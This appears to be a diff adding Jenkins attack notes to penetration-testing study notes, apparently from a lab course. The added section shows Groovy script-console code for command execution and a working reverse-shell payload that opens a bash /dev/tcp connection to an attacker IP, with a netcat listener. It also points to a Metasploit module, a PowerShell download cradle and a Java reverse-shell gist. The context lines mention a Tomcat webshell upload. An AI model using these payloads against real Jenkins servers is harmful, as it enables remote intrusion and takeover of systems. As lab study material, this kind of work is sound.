@@ -337,3 +337,43 @@ $ zip -r backup.war cmd.jsp
 FileOutputStream(f);stream.write(m);o="uPlOaDeD:
 ```
 * All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable to [Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) 
+
+# Jenkins
+*  open-source automation server written in Java that helps developers build and test their software projects continuously
+* Jenkins is often installed on Windows servers running as the SYSTEM account
+* runs on Tomcat port 8080 by default
+	* also utilizes port 5000 to attach slave servers
+* default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account
+
+### Attacking Jenkins
+* a quick way of achieving command execution on the underlying server is via the script console
+	* allows us to run arbitrary Groovy scripts within the Jenkins controller runtime
+	* can be reached at the URL `http://jenkins.inlanefreight.local:8000/script`
+	* For example, we can use the following snippet to run the `id` command
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+* various ways that access to the script console can be leveraged to gain a reverse shell
+	* metasploit: `exploit/multi/http/jenkins_script_console`
+	* commands:
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+* results in a reverse shell connection
+```bash
+nc -lvnp 8443
+```
+* Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with `Invoke-PowerShellTcp.ps1`
+```groovy
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+* could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port
+* 
